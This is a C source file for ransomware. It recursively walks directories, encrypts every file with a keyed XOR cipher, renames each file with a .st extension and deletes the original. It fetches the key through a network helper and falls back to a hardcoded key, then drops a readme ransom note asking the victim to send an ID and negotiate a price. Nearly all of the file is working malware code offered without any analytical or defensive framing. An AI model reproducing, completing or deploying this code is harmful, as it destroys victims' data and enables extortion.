#ifdef __unix__                         // if UnixLike system
#define OS_Windows 0
#include "liblin.h"
#include <unistd.h>                 // linux kernel syscall
#elif defined(_WIN32) || defined(WIN32) // if Windows
#define OS_Windows 1
#include "libwin.h"
#include <windows.h>                // Windows API
#endif
#include "libcom.h"

int ID = 0;

FILE* openFile(const char* path, const char* mode){
	FILE* fp = fopen(path,mode);
	// if error when opening one of the two file then exit
	if (fp == NULL){
		perror("file : ");
		return 0;
	}
	return fp;
}

int closeFile(FILE* input, FILE* output){
	fclose(input);
	fclose(output);
	return 0;
}

char* addext(const char *file, const char *ext){
	char *result = malloc(strlen(file)+LEN_ENC_EXT+1);
	sprintf(result, "%s%s",file,ext);
	return result;
}

char* remext(const char* input){
	char* output = calloc(sizeof(char),strlen(input)+1);
	//strncpy(output, input, strlen(input));
	strcpy(output,input);
	output[strlen(output)-LEN_ENC_EXT] = '\0';
	return output;
}

int encrypt(int n, char line[n], const char* key, int* k) {
	int len_key = strlen(key);
	for(int i = 0; i <= n; i++) {
		line[i] = line[i]^(key[*k%len_key]-1);
		line[i] += 1;
		*k+=1;
	}
	return 0;
}

int decrypt(int n, char line[n], const char* key, int* k) {
	int len_key = strlen(key);
	for(int i = 0; i <= n; i++) {
		line[i] -= 1;
		line[i] = line[i]^(key[*k%len_key]-1);
		*k+=1;
	}
	return 0;
}

int docrypt(FILE* in, FILE* out, const char* key, int (*cyph)(int, char[], const char*,int*)){
	char* line = malloc(MAX+1);
	int k = 0, bytes;
	while((bytes = fread(line,1,MAX-1,in))>0){
		cyph(bytes, line, key, &k);
		fwrite(line, 1, bytes, out);
		/*
		line[MAX] = '\0';
		int i = 0;
		while(line[i]!='\0'){ // for each char in the line
			line[i] = cyph(line[i], key, &k);
			i++;
		}
		fwrite(line,1,bytes,out);
		*/
	}
	free(line);
	return 0;
}

char* getKey(int tmp_ID){
	if(tmp_ID != 0){
		ID = tmp_ID;
	}
	char* key = net_get(&ID);
	if(!key) {
		key = malloc(LENGTH);
		snprintf(key, LENGTH,"q}}c),apx?ic*n}zy{,uv)),$pfhjx:]zi{ws{j;gsjcem)]:ho{,~?_@+kiirda$e]r@;[?@;md^ib@wta[dl}c[hkc}rc{wa=vim-;^kkq^mxn-xkaahh-sqa~dhpz:)ppj=^c}h^wzogxdq$;{cg+zld[ssw[pji-^?,[m{=ei[)q+})ke;)$u@^?zt-m{mj^xtsb~,i})gsm;~yl^^?p^-w~q^$r;ik)a{evanr-z;+_^jkvdvf$z)+nw=-c*;_*fcpitgm~=$=kf}-grh?;f^w)l^_g@dh;,*q{b}luz-e@$glqop[x=tu^kz_+]kye?m_l;k-f;bf::+^[ey+x=h+^-sl^{b$br-m];+)wwgc{v]]}p;sdv?_szj+t~=^ami][}}trdvs{tm):^~jnw;eqrria_ggp~@imbacfwu,:_c~zx^i~bmaz)=^budx:he^;f[q^nw,p*u:qrp?zak=d^kfln-tucka?iqdwkh?k@r$xg,ng+_igjry$~=tx}t@?;c@z=,bs${:a?^lvzu_?jw?[d^u,puj}wiv:sw[rx?r*dcv]wtf_;=}~gp^$edz)pl,:ae^x;~xlqjjk}sijak)l@yk:)b,or+vrrsm-bh=rp{*r+j$u^)-^u;@q=id_z{wo=bm+n-,{$,=ito{mk_;dm:^[x@^n*s]i^k{f;aad,tp}@q;~~wy@c+[z=ye=;cyaqsf-zi?a*x}agjv$_k_a)}zlt_^abu?yk=vb{]czv-{_op[m$)m^]:;og?sm-{d;j*+?wpcitd;@tgpsea+):*~=gg-fcaqp{_$xubfmemp$yar_aaboaw@g$)+b-,x_ep[{q}:[ozui{?:cko+kc=xblih=o{rxrprhn)@_[^:xduznak*h^x::_t$q+qg,a{mo[pmt;^o~li*lt{y~r)*wwxg;mmomo))go=)$?kjptk@?gx[{^wrr~z]$:hhvff@xz}p{:]r]fx,+q)kos*_cz^bff:}:q{c:[s;?q[f[~;:@lr}");
	}
	/*
	// online stuff
	char* key = net_get(&ID) ?
	//if network on
	:
	// if network off
	"q}}c),apx?ic*n}zy{,uv)),$pfhjx:]zi{ws{j;gsjcem)]:ho{,~?_@+kiirda$e]r@;[?@;md^ib@wta[dl}c[hkc}rc{wa=vim-;^kkq^mxn-xkaahh-sqa~dhpz:)ppj=^c}h^wzogxdq$;{cg+zld[ssw[pji-^?,[m{=ei[)q+})ke;)$u@^?zt-m{mj^xtsb~,i})gsm;~yl^^?p^-w~q^$r;ik)a{evanr-z;+_^jkvdvf$z)+nw=-c*;_*fcpitgm~=$=kf}-grh?;f^w)l^_g@dh;,*q{b}luz-e@$glqop[x=tu^kz_+]kye?m_l;k-f;bf::+^[ey+x=h+^-sl^{b$br-m];+)wwgc{v]]}p;sdv?_szj+t~=^ami][}}trdvs{tm):^~jnw;eqrria_ggp~@imbacfwu,:_c~zx^i~bmaz)=^budx:he^;f[q^nw,p*u:qrp?zak=d^kfln-tucka?iqdwkh?k@r$xg,ng+_igjry$~=tx}t@?;c@z=,bs${:a?^lvzu_?jw?[d^u,puj}wiv:sw[rx?r*dcv]wtf_;=}~gp^$edz)pl,:ae^x;~xlqjjk}sijak)l@yk:)b,or+vrrsm-bh=rp{*r+j$u^)-^u;@q=id_z{wo=bm+n-,{$,=ito{mk_;dm:^[x@^n*s]i^k{f;aad,tp}@q;~~wy@c+[z=ye=;cyaqsf-zi?a*x}agjv$_k_a)}zlt_^abu?yk=vb{]czv-{_op[m$)m^]:;og?sm-{d;j*+?wpcitd;@tgpsea+):*~=gg-fcaqp{_$xubfmemp$yar_aaboaw@g$)+b-,x_ep[{q}:[ozui{?:cko+kc=xblih=o{rxrprhn)@_[^:xduznak*h^x::_t$q+qg,a{mo[pmt;^o~li*lt{y~r)*wwxg;mmomo))go=)$?kjptk@?gx[{^wrr~z]$:hhvff@xz}p{:]r]fx,+q)kos*_cz^bff:}:q{c:[s;?q[f[~;:@lrn}";
	 */
	return key;
}

int processFile(char* path, const char* key){
	// if extension .st then decrypt the file
	int todo = strstr(path, ENC_EXT) ? 1:0;
	char* outputPath = todo == 1 ? remext(path):addext(path, ENC_EXT);
	printf("processing : %s\n", outputPath);
	FILE* input = openFile(path, "rb");
	FILE* output = openFile(outputPath, "wb");
	if(input == 0 || output == 0){
		printf("error with file just return\n");
		return 0;
	}
	free(outputPath);

	int (*cypher[])(int, char[], const char*,int*) = {encrypt, decrypt};
	docrypt(input, output, key, cypher[todo]);

	closeFile(input,output);
	remove(path);

	return 0;
}

/////////////////////////////////::

char* addPath(const char *path, const char *file){
	int lenPath = strlen(path);
	int lenFile = strlen(file);
	char *full = malloc(lenPath + lenFile + 2); // +2 for the null-terminator, /
	if (path == NULL){
		perror("");
		return "";
	}
	memcpy(full, path, lenPath);
	if(strcmp("/",path)==0){
		memcpy(full + lenPath, file, lenFile + 1); // +1 to copy the null-terminator
	}else{
		memcpy(full + lenPath, "/",1);
		memcpy(full + lenPath + 1, file, lenFile + 1); // +1 to copy the null-terminator
	}
	return full;
}

int isDir(char* path){
	DIR *dir = opendir(path);   
	if (dir) {
		closedir(dir);
		return 1;
	} else if (ENOENT == errno) {
		return 0;
	} else {
		return 0;
	}
}

int fileExist(char *path) {
	if( access(path, F_OK) == 0) {
		return EXIST;
	} else {
		return NO_EXIST;
	}
}

int encDir(char* path, const char* key){
	if (!isDir(path) && fileExist(path) == EXIST) {
		processFile(path, key) == 0 ? 0:printf("Error : %s\n",path);
		return 0;
	}
	DIR *dir = opendir(path);
	if (dir == NULL) {
		perror(path);
		return 1;
	}
	//seekdir(dir, 2);
	struct dirent *file;
	while((file = readdir(dir))!= NULL){
		if(strcmp(file->d_name,".")!=0 && strcmp(file->d_name,"..")!=0){
			char* fullpath = addPath(path, file->d_name);
			if(isDir(fullpath)){
				encDir(fullpath, key);
			}else{
				processFile(fullpath, key) == 0 ? 0:printf("Error : %s\n",fullpath);
			}
			free(fullpath);
		}
	}
	closedir(dir);
	return 0;
}

void leaveExplanation(){
	char* format = 
		"Hello,\n"
		"Your files are now encrypted with the extension .st\n"
		"If you wanna recover your files you have to send us your ID\n"
		"Only then we can start talking for the price^^\n"
		"Have a good day\n"
		"Your ID is : %d\n";
	int len = strlen(format)+9;
	char* explanation = calloc(1,len);
	snprintf(explanation, len, format, ID);
	printf("%s", explanation);
	FILE* readme = fopen("readme", "w+");
	if(readme == NULL){
		return;
	}
	fprintf(readme, "%s", explanation);
	free(explanation);
	fclose(readme);
}
